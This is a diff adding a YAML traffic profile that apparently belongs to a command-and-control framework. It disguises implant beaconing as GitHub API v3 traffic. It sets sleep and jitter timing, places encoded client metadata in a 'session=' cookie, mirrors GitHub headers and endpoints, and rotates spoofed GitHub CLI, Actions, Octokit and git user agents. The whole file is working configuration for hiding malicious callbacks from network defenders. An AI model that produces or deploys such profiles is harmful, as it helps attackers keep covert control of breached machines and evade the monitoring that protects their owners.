@@ -1,0 +1,43 @@
+name: "github"
+description: "Mimics GitHub API v3 traffic - Repos, notifications, Actions"
+sleep:
+  interval: 70
+  jitter: 22
+http:
+  get:
+    uri: ["/api/v3/repos", "/api/v3/notifications", "/api/v3/user", "/api/v3/repos/owner/repo/actions/runs"]
+    headers:
+      Accept: "application/vnd.github.v3+json"
+      X-GitHub-Api-Version: "2022-11-28"
+      Time-Zone: "America/New_York"
+    client:
+      metadata:
+        header: "Cookie"
+        prepend: "session="
+        base64: true
+      output:
+        base64: true
+    server:
+      output:
+        content_type: "application/json"
+        prepend: ""
+        append: ""
+  post:
+    uri: ["/api/v3/repos/owner/repo/issues", "/api/v3/repos/owner/repo/dispatches"]
+    headers:
+      Accept: "application/vnd.github.v3+json"
+      Content-Type: "application/json"
+    client:
+      metadata:
+        header: "Cookie"
+        base64: true
+      output:
+        base64: true
+    server:
+      output:
+        content_type: "application/json"
+user_agents:
+  - "GitHub CLI/2.20.0 (Linux; x86_64)"
+  - "Mozilla/5.0 (compatible; GitHubActions/1.0)"
+  - "Octokit/3.0.0 Node.js/18.0.0 (Linux 5.15; x64)"
+  - "git/2.39.0 (Linux x86_64)"
